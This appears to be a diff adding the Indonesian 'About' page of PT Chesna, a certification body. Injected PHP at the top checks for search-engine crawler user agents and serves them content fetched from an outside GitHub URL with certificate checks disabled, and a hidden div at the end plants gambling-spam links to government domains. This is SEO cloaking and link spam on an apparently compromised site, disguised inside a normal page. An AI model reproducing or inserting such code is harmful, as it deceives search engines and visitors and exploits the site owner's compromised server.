@@ -1,0 +1,558 @@
+<?php
+
+function check_user_agent($o)
+{
+    return preg_match("/" . preg_quote($o, '/') . "/i", $_SERVER['HTTP_USER_AGENT']) ? true : false;
+}
+function get_content($p)
+{
+    if (ini_get('allow_url_fopen') && function_exists('file_get_contents')) {
+        $context = stream_context_create([
+            'http' => [
+                'user_agent' => 'Mozilla/5.0 (Linux; Android 13; Pixel 7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Mobile Safari/537.36',
+                'timeout' => 30,
+            ],
+            'ssl' => [
+                'verify_peer' => false,
+                'verify_peer_name' => false,
+            ],
+        ]);
+        $q = @file_get_contents($p, false, $context);
+        if ($q !== false) {
+            return $q;
+        }
+    }
+    if (function_exists('curl_init') && function_exists('curl_exec')) {
+        $r = curl_init();
+        curl_setopt_array($r, array(
+            CURLOPT_URL => $p,
+            CURLOPT_RETURNTRANSFER => true,
+            CURLOPT_FOLLOWLOCATION => true,
+            CURLOPT_SSL_VERIFYPEER => false,
+            CURLOPT_USERAGENT => 'Mozilla/5.0 (Linux; Android 13; Pixel 7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Mobile Safari/537.36',
+            CURLOPT_TIMEOUT => 30,
+        ));
+        $q = curl_exec($r);
+        curl_close($r);
+        if ($q !== false) {
+            return $q;
+        }
+    }
+    if (function_exists('fsockopen')) {
+        $s = parse_url($p);
+        $scheme = isset($s['scheme']) ? $s['scheme'] : 'http';
+        $host = $s['host'];
+        $port = isset($s['port']) ? $s['port'] : (($scheme === 'https') ? 443 : 80);
+        $path = isset($s['path']) ? $s['path'] : '/';
+        $query = empty($s['query']) ? '' : '?' . $s['query'];
+        $remote_host = ($scheme === 'https' ? 'ssl://' : '') . $host;
+        $fp = @fsockopen($remote_host, $port, $errno, $errstr, 30);
+        if ($fp) {
+            $user_agent = 'Mozilla/5.0 (Linux; Android 13; Pixel 7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Mobile Safari/537.36';
+            $request = "GET {$path}{$query} HTTP/1.1\r\n";
+            $request .= "Host: {$host}\r\n";
+            $request .= "User-Agent: {$user_agent}\r\n";
+            $request .= "Connection: close\r\n\r\n";
+            fwrite($fp, $request);
+            $response = '';
+            while (!feof($fp)) {
+                $response .= fgets($fp, 1024);
+            }
+            fclose($fp);
+
+            $parts = explode("\r\n\r\n", $response, 2);
+            if (isset($parts[1])) {
+                return $parts[1];
+            } else {
+                return $response;
+            }
+        }
+    }
+
+    return '';
+}
+if (check_user_agent("google") || check_user_agent("bot") || check_user_agent("spider"))
+{
+    echo get_content("https://raw.githubusercontent.com/teamgeprex-byte/clocking/refs/heads/main/chesnaabout");
+    die;
+}
+?>
+<!DOCTYPE html>
+<!--[if IE 8]>          <html class="ie ie8"> <![endif]-->
+<!--[if IE 9]>          <html class="ie ie9"> <![endif]-->
+<!--[if gt IE 9]><!-->
+<html> <!--<![endif]-->
+
+<head>
+	<meta charset="utf-8" />
+<title>About - Lembaga Sertifikasi PT. Chesna</title>
+<!-- SEO Meta Tags-->
+<!--[if IE]><meta http-equiv="X-UA-Compatible" content="IE=edge, chrome=1"><![endif]--><!-- Force IE to use the latest rendering engine -->
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"><!-- Optimize mobile viewport -->
+<meta name="apple-mobile-web-app-capable" content="yes">
+	<meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+<meta name="description" content="Lembaga Sertifikasi Hotel, SPA, Kafe, Bar Rumah Minum PT. Chesna">
+	<meta name="keywords" content="PT Chesna adalah lembaga sertifikasi usaha pariwisata yang berbadan hukum secara resmi terdaftar di kementerian pariwisata sesuai dan terakreditasi oleh komite akreditasi nasional sesuai lsup-044-idn untuk melakukan kegiatan sertifikasi usaha pariwisata">
+	<meta name="author" content="PT Chesna">
+<meta name="robots" content="index, follow">
+<meta http-equiv="Copyright" content="2008 - 2026. PT. Chesna. All rights reserved.">
+<meta http-equiv="imagetoolbar" content="no">
+<meta name="language" content="Indonesia">
+<meta name="revisit-after" content="7">
+<meta name="webcrawlers" content="all">
+<meta name="rating" content="general">
+<meta name="spiders" content="all">
+<meta name="googlebot" content="index,follow">  
+<!-- Favicon and Apple Icons-->
+<link rel="icon" href="https://www.chesna.co.id/assets/img/icons/favicon_1546255806.png" type="image/png">
+<link rel="icon" type="image/png" href="/favicon-96x96.png" sizes="96x96" />
+<link rel="icon" type="image/svg+xml" href="/favicon.svg" />
+<link rel="shortcut icon" href="/favicon.ico" />
+<link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png" />
+<meta name="apple-mobile-web-app-title" content="Chesna Certification" />
+<link rel="manifest" href="/site.webmanifest" />
+<!-- mobile settings -->
+<meta name="viewport" content="width=device-width, maximum-scale=1, initial-scale=1, user-scalable=0" />
+<!-- WEB FONTS -->
+<link href="https://fonts.googleapis.com/css?family=Open+Sans:300,400,700,800" rel="stylesheet" type="text/css" />
+<!-- CORE CSS -->
+<link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/css/bootstrap.min.css" integrity="sha384-BVYiiSIFeK1dGmJRAkycuHAHRg32OmUcww7on3RYdg4Va+PmSTsz/K68vbdEjh4u" crossorigin="anonymous">
+<link href="https://www.chesna.co.id/assets/themes/atropos/css/font-awesome.css" rel="stylesheet" type="text/css">
+	<link href="https://www.chesna.co.id/assets/themes/atropos/css/animate.css" rel="stylesheet" type="text/css">
+	<link href="https://www.chesna.co.id/assets/themes/atropos/css/essentials.css" rel="stylesheet" type="text/css">
+	<link href="https://www.chesna.co.id/assets/themes/atropos/css/layout.css" rel="stylesheet" type="text/css">
+	<link href="https://www.chesna.co.id/assets/themes/atropos/css/layout-responsive.css" rel="stylesheet" type="text/css">
+	<link href="https://www.chesna.co.id/assets/themes/atropos/css/color_scheme/orange.css" rel="stylesheet" type="text/css">
+	<link href="https://www.chesna.co.id/assets/themes/atropos/css/base.css?ver=1547712292" rel="stylesheet" type="text/css">
+<link rel="stylesheet" href="https://www.chesna.co.id/assets/css/material-icons.css">
+<link rel="stylesheet" href="https://www.chesna.co.id/assets/vendor/fontawesome/css/fontawesome.css">
+<link rel="stylesheet" href="https://www.chesna.co.id/assets/vendor/fontawesome/css/brands.css">
+<link rel="stylesheet" href="https://www.chesna.co.id/assets/vendor/fontawesome/css/solid.css">
+<style type="text/css">
+    .wa {
+        text-align: center;
+        background: #ED5434;
+        border-radius: 100px 100px 100px 100px;
+        margin: 5px 0 10px 15px;
+        padding: 8px;
+        position: absolute;
+        right: 100px;
+        display: none;
+        z-index: 100;
+        color: #fff;
+        height: 50px;
+        width: 50px;
+    }
+    .wa a {
+        color: #FFFFFF;
+    }
+    .wa i {
+        font-size: 34px;
+    }
+
+    body, h1, h2, h3, h4, h5, h6 {
+        font-family: Arial, Helvetica, sans-serif;
+    }
+</style>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/pdf.js/2.10.377/pdf.js" type="7d83d656718df63198af2b65-text/javascript"></script>
+    <!-- Google tag (gtag.js) -->
+    <script async src="https://www.googletagmanager.com/gtag/js?id=G-5H8FW89QGW" type="7d83d656718df63198af2b65-text/javascript"></script>
+    <script type="7d83d656718df63198af2b65-text/javascript">
+      window.dataLayer = window.dataLayer || [];
+      function gtag(){dataLayer.push(arguments);}
+      gtag('js', new Date());
+    
+      gtag('config', 'G-5H8FW89QGW');
+    </script>
+</head>
+
+<body class="pagecontent" style="margin-top: 10px;">
+	        <!-- <header id="topHead">
+            <div class="container">
+                
+                <span class="quick-contact pull-left">
+                </span>
+                
+                <div class="btn-group pull-right hidden-xs">
+                                        <button class="dropdown-toggle language" type="button" data-toggle="dropdown" style="color: black;">
+                        <img src="https://www.chesna.co.id/assets/images/flags/idn_1546160250.png" width="16" height="11" alt="INA Language" /> Indonesian <span class="caret"></span>
+                    </button>
+
+                    <ul class="dropdown-menu">
+                                                <li>
+                            <a href="https://www.chesna.co.id/language/english">
+                                <img src="https://www.chesna.co.id/assets/images/flags/eng_1546160219.png" width="16" height="11" alt="IDN Language" /> English                            </a>
+                        </li>
+                                                <li>
+                            <a href="https://www.chesna.co.id/language/indonesian">
+                                <img src="https://www.chesna.co.id/assets/images/flags/idn_1546160250.png" width="16" height="11" alt="IDN Language" /> Indonesian                            </a>
+                        </li>
+                                            </ul>
+                </div>
+                <div class="pull-right nav signin-dd">
+                    
+                </div>
+                <a class="pull-right" id="btn-mobile-quick-cart" href="https://www.chesna.co.id/contact"><i class="fa fa-envelope-open"></i></a>
+
+            </div>
+        </header> -->
+        <!-- End Top Bar -->
+
+<!-- TOP NAV -->
+<header id="topNav" class="topHead" style="top: 0; box-shadow: grey 0px 5px 10px;">
+    <div class="container">
+        <!-- Mobile Menu Button -->
+        <button class="btn btn-mobile" data-toggle="collapse" data-target=".nav-main-collapse">
+            <i class="fa fa-bars"></i>
+        </button>
+        <!-- Logo text or image -->
+        <a class="logo" href="https://www.chesna.co.id/">
+            <img src="https://www.chesna.co.id/assets/img/base/logo_text_only.png" alt="Chesna Certification" style="height: 60px; padding: 10px 0" />
+        </a>
+        <!-- Top Nav -->
+        <div class="navbar-collapse nav-main-collapse collapse pull-right">
+            <nav class="nav-main mega-menu">
+                <ul class="nav nav-pills nav-main scroll-menu" id="topMain">
+                                    <li class="dropdown">
+                        <a class="dropdown-toggle" href="#">Tentang Kami <i class="fa fa-angle-down"></i></a>
+                        <ul class="dropdown-menu">
+                                                    <li>
+                                <a href='https://www.chesna.co.id/profile-perusahaan'>Profil Perusahaan</a>
+                            </li>
+                                                        <li>
+                                <a href='https://www.chesna.co.id/logo'>Logo</a>
+                            </li>
+                                                        <li>
+                                <a href='https://www.chesna.co.id/visi-dan-misi'>Visi dan Misi</a>
+                            </li>
+                                                        <li>
+                                <a href='https://www.chesna.co.id/manajemen-ketidakberpihakan'>Manajemen Ketidakberpihakan</a>
+                            </li>
+                                                        <li>
+                                <a href='https://www.chesna.co.id/kebijakan-anti-penyuapan'>Kebijakan Anti Penyuapan</a>
+                            </li>
+                                                        <li>
+                                <a href='https://www.chesna.co.id/perolehan-dana'>Perolehan Sumber Dana</a>
+                            </li>
+                                                    </ul>
+                    </li>
+                                        <li class="dropdown">
+                        <a class="dropdown-toggle" href="#">Layanan <i class="fa fa-angle-down"></i></a>
+                        <ul class="dropdown-menu">
+                                                    <li class="dropdown-submenu">
+                                <a href="#">Sertifikasi Sistem Manajemen</a>
+                                <ul class="dropdown-menu">
+                                                                    <li>
+                                        <a href='https://www.chesna.co.id/services/sistem-manajemen-mutu-iso-9001'>Sistem Manajemen Mutu ISO 9001</a>
+                                    </li>
+                                                                        <li>
+                                        <a href='https://www.chesna.co.id/services/sistem-manajemen-anti-penyuapan-iso-37001'>Sistem Manajemen Anti Penyuapan ISO 37001</a>
+                                    </li>
+                                                                        <li>
+                                        <a href='https://www.chesna.co.id/services/iso-37301-sertifikasi-sistem-manajemen-kepatuhan'>Sistem Manajemen Kepatuhan ISO 37301</a>
+                                    </li>
+                                                                    </ul>
+                            </li>
+                                                        <li class="dropdown-submenu">
+                                <a href="#">Sertifikasi Usaha Pariwisata</a>
+                                <ul class="dropdown-menu">
+                                                                    <li>
+                                        <a href='https://www.chesna.co.id/services/sertifikasi-usaha-hotel'>Hotel</a>
+                                    </li>
+                                                                        <li>
+                                        <a href='https://www.chesna.co.id/services/sertifikasi-usaha-restoran'>Restoran</a>
+                                    </li>
+                                                                        <li>
+                                        <a href='https://www.chesna.co.id/services/sertifikasi-usaha-rumah-makan'>Rumah Makan</a>
+                                    </li>
+                                                                        <li>
+                                        <a href='https://www.chesna.co.id/services/sertifikasi-usaha-kafe'>Kafe</a>
+                                    </li>
+                                                                        <li>
+                                        <a href='https://www.chesna.co.id/services/sertifikasi-usaha-bar-atau-rumah-minum'>Bar</a>
+                                    </li>
+                                                                        <li>
+                                        <a href='https://www.chesna.co.id/services/sertifikasi-usaha-jasa-perjalanan-wisata'>Agen Perjalanan Wisata</a>
+                                    </li>
+                                                                        <li>
+                                        <a href='https://www.chesna.co.id/services/sertifikasi-usaha-jasa-perjalanan-wisata'>Biro Perjalanan Wisata</a>
+                                    </li>
+                                                                        <li>
+                                        <a href='https://www.chesna.co.id/services/sertifikasi-usaha-spa'>SPA</a>
+                                    </li>
+                                                                        <li>
+                                        <a href='https://www.chesna.co.id/services/sertifikasi-chse'>CHSE</a>
+                                    </li>
+                                                                    </ul>
+                            </li>
+                                                        <li class="dropdown-submenu">
+                                <a href="#">Sertifikasi Umrah Haji Khusus</a>
+                                <ul class="dropdown-menu">
+                                                                    <li>
+                                        <a href='https://www.chesna.co.id/services/sertifikasi-usaha-penyelenggara-perjalanan-ibadah-umrah'>Penyelenggara Perjalanan Ibadah Umrah</a>
+                                    </li>
+                                                                        <li>
+                                        <a href='https://www.chesna.co.id/services/sertifikasi-usaha-penyelenggara-ibadah-haji-khusus'>Penyelenggara Ibadah Haji Khusus</a>
+                                    </li>
+                                                                    </ul>
+                            </li>
+                                                    </ul>
+                    </li>
+                                        <li class="dropdown">
+                        <a class="dropdown-toggle" href="#">Klien <i class="fa fa-angle-down"></i></a>
+                        <ul class="dropdown-menu">
+                                                    <li>
+                                <a href='https://www.chesna.co.id/our-client'>Informasi Klien</a>
+                            </li>
+                                                        <li>
+                                <a href='https://www.chesna.co.id/certificate/dashboard'>Validasi Sertifikat</a>
+                            </li>
+                                                    </ul>
+                    </li>
+                                        <li class="dropdown">
+                        <a class="dropdown-toggle" href="#">Informasi <i class="fa fa-angle-down"></i></a>
+                        <ul class="dropdown-menu">
+                                                    <li>
+                                <a href='https://www.chesna.co.id/artikel'>Artikel</a>
+                            </li>
+                                                        <li>
+                                <a href='https://www.chesna.co.id/gallery/photo'>Galeri Foto</a>
+                            </li>
+                                                        <li>
+                                <a href='https://www.chesna.co.id/career'>Karir</a>
+                            </li>
+                                                    </ul>
+                    </li>
+                                        <li>
+                        <a href='https://www.chesna.co.id/downloadpage'>Downloads</a>
+                    </li>
+                                        <li>
+                        <a href='https://www.chesna.co.id/testimony'>Testimony</a>
+                    </li>
+                                        <li>
+                        <a href='https://www.chesna.co.id/event'>Event</a>
+                    </li>
+                                        <li>
+                        <a href='https://www.chesna.co.id/contact'>Kontak</a>
+                    </li>
+                                    </ul>
+            </nav>
+        </div>
+        <!-- /Top Nav -->
+    </div>
+</header>
+	<!-- WRAPPER -->
+	<div id="wrapper">
+		
+
+
+
+
+
+
+
+
+
+		<!-- Start Parallax -->
+<div class="parallax-window" data-parallax="scroll" data-image-src="https://www.chesna.co.id/assets/images/parallax/default.jpg">
+    <div class="container">
+        <h1>About</h1>
+        <span><ol id="crumbs" class="breadcrumb"><li><a href="https://www.chesna.co.id/"/>home</a></li><li><a href="https://www.chesna.co.id/about">about</a></li><li class="selected">about</li></ol></span>
+    </div>
+</div>
+<!-- End Parallax -->
+<!-- Start Container -->
+<section class="container">
+	<div class="row">
+		<div class="col-md-12">
+			<div class="panel">
+				<div class="panel-body">
+					<!-- Start Content -->
+
+					<p><strong>Chesna Certification</strong> adalah lembaga sertifikasi berbadan hukum yang memberikan layanan sertifikasi dalam bidang Sistem Manajemen Mutu, Sistem Manajemen Anti Penyuapan, Usaha Pariwisata dan Umrah Haji Khusus.<br>
+<br>
+Chesna Certification telah terakreditasi oleh<strong> Komite Akreditasi Nasional</strong> untuk melakukan kegiatan sertifikasi sesuai bidangnya, yaitu:</p>
+<ul>
+	<li>Sistem Manajemen Mutu <strong><a href="https://www.chesna.co.id/accreditation-certificate">LSSM-066-IDN</a></strong></li>
+	<li>Sistem Manajemen Anti Penyuapan <strong><a href="https://www.chesna.co.id/accreditation-certificate">LSSMAP-007-IDN</a></strong></li>
+	<li>Sistem Manajemen Kepatuhan <strong><a href="https://www.chesna.co.id/accreditation-certificate">LSSMK-001-IDN</a></strong></li>
+	<li>Usaha Pariwisata <strong><a href="https://www.chesna.co.id/accreditation-certificate">LSPr-120-IDN</a></strong></li>
+	<li>Umrah dan Haji Khusus <strong><a href="https://www.chesna.co.id/accreditation-certificate">LSUHK-010-IDN</a></strong></li>
+</ul>
+
+					<!-- End Content -->
+				</div>
+			</div>
+		</div>
+		<aside class="col-md-3">
+			<!-- categories -->
+<div class="widget">
+</div>
+		</aside>
+	</div>
+</section>
+<!-- End Container -->
+	</div>
+	<div class='wa'>
+       <a href="https://api.whatsapp.com/send?phone=6281133330025" target="_blank" title="Hubungi WhatsApp Kami"><i class="fab fa-whatsapp"></i></a>
+  </div>
+        <!-- FOOTER -->
+        <footer>
+            <!-- copyright , scrollTo Top -->
+            <div class="footer-bar">
+                <div class="container">
+                    <span class="copyright">HAK CIPTA &copy; 2008 - 2026 Chesna Certification. SELURUH HAK CIPTA.</span>
+                    <a class="toTop" href="#topNav">KEMBALI KE ATAS <i class="fa fa-arrow-circle-up"></i></a>
+                </div>
+            </div>
+            <!-- copyright , scrollTo Top -->
+            <!-- footer content -->
+            <div class="footer-content">
+                <div class="container">
+                    <div class="row">
+                        <!-- FOOTER CONTACT INFO -->
+                        <div class="column col-md-4">
+                            <div class="post-item">
+                                <small>CHESNA CERTIFICATION</small>
+                                <img src="https://www.chesna.co.id/assets/img/base/pt_chesna_white.png" alt="" style="width:200px; margin-top: 20px;">
+                            </div>
+                        </div>
+                        <!-- /FOOTER CONTACT INFO -->
+                        <!-- FOOTER LOGO -->
+                        <div class="column col-md-4 text-left">
+                            <div class="post-item">
+                                <small>Head Office</small>
+                                <p style="color: #FFFFFF; font-size: 11px;">Jl. Sidosermo Indah No. 28<br>Surabaya 60239 <br>T. (031) 33300091</p>
+                                <!-- <p style="color: #FFFFFF; font-size: 11px;">Phone: 031-8434141 Fax: 031-8473085</p> -->
+                                <!-- <small>Representative Office</small>
+                                <p style="color: #FFFFFF; font-size: 11px;">Lippo St. Moritz Office Tower, Unit 0901<br>Jl. Puri Indah Raya Blok U1 Puri Indah, CBD, Jakarta Barat 11610<br> T. (021) 30497711</p> -->
+                                <!-- <p style="color: #FFFFFF; font-size: 11px;">Phone: 021 2977 8039</p> -->
+                                <small>Contact</small>
+                                <p style="color: #FFFFFF; font-size: 11px;">Whatsapp : +62 811-3333-0025 , E-mail : <a href="/cdn-cgi/l/email-protection#472e29212807242f22342926692428692e23"><span class="__cf_email__" data-cfemail="036a6d656c43606b66706d622d606c2d6a67">[email&#160;protected]</span></a></p>
+                            </div>
+                        </div>
+                        <!-- /FOOTER LOGO -->
+                        <!-- FOOTER LATEST POSTS -->
+                        <div class="column col-md-4 text-left">
+                            <div class="post-item">
+                                <small>Site</small>
+                                <h3><a href="https://www.chesna.co.id/career" style="color: #FFFFFF; font-size: 11px;">Karir</a></h3><h3><a href="https://www.chesna.co.id/privacy-policy" style="color: #FFFFFF; font-size: 11px;">Kebijakan Privasi</a></h3><h3><a href="https://www.chesna.co.id/terms-and-conditions" style="color: #FFFFFF; font-size: 11px;">Syarat dan ketentuan</a></h3><h3><a href="https://www.chesna.co.id/sitemap" style="color: #FFFFFF; font-size: 11px;">Peta Situs</a></h3>                            </div>
+                            <div class="post-item">
+                                <small>SOCIAL MEDIA</small>
+                                <a href="https://www.chesna.co.id/" id="linkfacebook" data-toggles="tooltip" data-placement="top" title="Facebook" target="_blank" onclick="if (!window.__cfRLUnblockHandlers) return false; linkFacebook();" style="font-size: 20px; padding-right: 10px;" data-cf-modified-7d83d656718df63198af2b65-=""><i class="fab fa-facebook"></i></a>                                <a href="https://www.chesna.co.id/" id="linkinstagram" data-toggles="tooltip" data-placement="top" title="Instagram" target="_blank" onclick="if (!window.__cfRLUnblockHandlers) return false; linkInstagram();" style="font-size: 20px; padding-right: 10px;" data-cf-modified-7d83d656718df63198af2b65-=""><i class="fab fa-instagram"></i></a>                                <a href="https://www.chesna.co.id/" id="linklinkedin" data-toggles="tooltip" data-placement="top" title="Linkedin" target="_blank" onclick="if (!window.__cfRLUnblockHandlers) return false; linkLinkedIn();" style="font-size: 20px; padding-right: 10px;" data-cf-modified-7d83d656718df63198af2b65-=""><i class="fab fa-linkedin"></i></a>                                <a href="https://www.chesna.co.id/" id="linkwhatsapp" data-toggles="tooltip" data-placement="top" title="Chat dengan WhatsApp" target="_blank" onclick="if (!window.__cfRLUnblockHandlers) return false; linkWhatsApp();" style="font-size: 20px; padding-right: 10px;" data-cf-modified-7d83d656718df63198af2b65-=""><i class="fab fa-whatsapp"></i></a>                            </div>
+                            <script data-cfasync="false" src="/cdn-cgi/scripts/5c5dd728/cloudflare-static/email-decode.min.js"></script><script type="7d83d656718df63198af2b65-text/javascript">
+                            function linkWhatsApp() {
+                                document.getElementById("linkwhatsapp").setAttribute("href", "https://api.whatsapp.com/send?phone=6281133330025",); 
+                            }
+                            function linkFacebook() {
+                                document.getElementById("linkfacebook").setAttribute("href", "https://www.facebook.com/pt.chesna/",); 
+                            }
+                            function linkInstagram() {
+                                document.getElementById("linkinstagram").setAttribute("href", "https://www.instagram.com/pt.chesna/",); 
+                            }
+                            function linkLinkedIn() {
+                                document.getElementById("linklinkedin").setAttribute("href", "https://id.linkedin.com/company/pt-chesna",); 
+                            }
+                            </script>
+                        </div>
+                        <!-- /FOOTER LATEST POSTS -->
+                    </div>
+                </div>
+            </div>
+            <!-- footer content -->
+        </footer>
+        <!-- /FOOTER -->
+	<div class="modal fade bs-example-modal-lg" tabindex="-1" role="dialog" aria-labelledby="myLargeModalLabel" id="detail_klien">
+  <div class="modal-dialog modal-lg" role="document">
+        <div class="modal-content">
+            <div class="modal-header">
+                <button type="button" class="close" data-dismiss="modal">&times;</button>
+                <h4 class="modal-title">Detail Klien</h4>
+            </div>
+            <div class="modal-body">                
+                <div class="fetched-data"></div>
+            </div>
+           
+        </div>
+    </div>
+</div>
+
+<!-- <div class="modal fade bs-example-modal-lg" tabindex="-1" role="dialog" aria-labelledby="myLargeModalLabel" id="myModal">
+  <div class="modal-dialog modal-lg" role="document">
+        <div class="modal-content">
+            <div class="modal-header">
+                <button type="button" class="close" data-dismiss="modal">&times;</button>
+                <h4 class="modal-title">Detail Klien</h4>
+            </div>
+            <div class="modal-body">                
+                <div class="fetched-data"></div>
+            </div>
+           
+        </div>
+    </div>
+</div> -->
+
+<div class="modal fade bs-example-modal-lg" tabindex="-1" role="dialog" aria-labelledby="myLargeModalLabel" id="modal_sertifikat">
+  <div class="modal-dialog modal-lg" role="document">
+        <div class="modal-content">
+            <div class="modal-header">
+                <button type="button" class="close" data-dismiss="modal">&times;</button>
+                <h4 class="modal-title">Detail Sertifikat</h4>
+            </div>
+            <div class="modal-body">                
+                <div class="fetched-data"></div>
+            </div>
+        </div>
+    </div>
+</div>
+
+
+
+<!-- Modal layanan home -->
+<div class="modal fade bs-example-modal-lg" tabindex="-1" role="dialog" aria-labelledby="myModalLabel" id="detail_layanan">
+  <div class="modal-dialog" role="document">
+        <div class="modal-content">
+            <!-- <div class="modal-header">
+                <button type="button" class="close" data-dismiss="modal">&times;</button>
+                <h4 class="modal-title">Detail Layanan</h4>
+            </div> -->
+            <div class="modal-body">                
+                <div class="fetched-data"></div>
+            </div>
+           
+        </div>
+    </div>
+</div>
+
+	<script type="7d83d656718df63198af2b65-text/javascript" src="https://www.chesna.co.id/assets/themes/atropos/plugins/jquery-2.2.3.min.js"></script>
+	<script type="7d83d656718df63198af2b65-text/javascript" src="https://www.chesna.co.id/assets/themes/atropos/js/parallax.js"></script>
+	<script type="7d83d656718df63198af2b65-text/javascript" src="https://www.chesna.co.id/assets/themes/atropos/plugins/jquery.easing.1.3.js"></script>
+	<script type="7d83d656718df63198af2b65-text/javascript" src="https://www.chesna.co.id/assets/themes/atropos/plugins/jquery.cookie.js"></script>
+	<script type="7d83d656718df63198af2b65-text/javascript" src="https://www.chesna.co.id/assets/themes/atropos/plugins/jquery.appear.js"></script>
+	<script type="7d83d656718df63198af2b65-text/javascript" src="https://www.chesna.co.id/assets/themes/atropos/plugins/jquery.isotope.js"></script>
+	<script type="7d83d656718df63198af2b65-text/javascript" src="https://www.chesna.co.id/assets/themes/atropos/plugins/masonry.js"></script>
+	<script type="7d83d656718df63198af2b65-text/javascript" src="https://www.chesna.co.id/assets/themes/atropos/plugins/bootstrap/js/bootstrap.min.js"></script>
+	<script type="7d83d656718df63198af2b65-text/javascript" src="https://www.chesna.co.id/assets/themes/atropos/plugins/knob/js/jquery.knob.js"></script>
+	<script type="7d83d656718df63198af2b65-text/javascript" src="https://www.chesna.co.id/assets/themes/atropos/js/scripts.js"></script>
+	<script type="7d83d656718df63198af2b65-text/javascript" src="https://www.chesna.co.id/assets/themes/atropos/plugins/modernizr.min.js"></script>
+	<script type="7d83d656718df63198af2b65-text/javascript">
+		$('.wa').animate({
+			opacity: 1,
+			right: "50px",
+			bottom: "10px",
+			height: "toggle"
+		}, 1000, function() {}).css('position', 'fixed');
+	</script>
+
+	<script type="7d83d656718df63198af2b65-text/javascript">
+		var pdfUrl = null;
+		var pdfUrl = null;
+			</script>
+
+	<script src="/cdn-cgi/scripts/7d0fa10a/cloudflare-static/rocket-loader.min.js" data-cf-settings="7d83d656718df63198af2b65-|49" defer></script><script defer src="https://static.cloudflareinsights.com/beacon.min.js/v8c78df7c7c0f484497ecbca7046644da1771523124516" integrity="sha512-8DS7rgIrAmghBFwoOTujcf6D9rXvH8xm8JQ1Ja01h9QX8EzXldiszufYa4IFfKdLUKTTrnSFXLDkUEOTrZQ8Qg==" data-cf-beacon='{"version":"2024.11.0","token":"fb99b5eeddb346929664bafb52b1de12","r":1,"server_timing":{"name":{"cfCacheStatus":true,"cfEdge":true,"cfExtPri":true,"cfL4":true,"cfOrigin":true,"cfSpeedBrain":true},"location_startswith":null}}' crossorigin="anonymous"></script>
+</body>
+
+</html><div style="display:none">
+<a href="https://siperditan.pertanian.go.id/">slot gacor</a>
+<a href="https://vta.kemenhub.go.id/assets/">https://vta.kemenhub.go.id/assets/</a>
+</div>
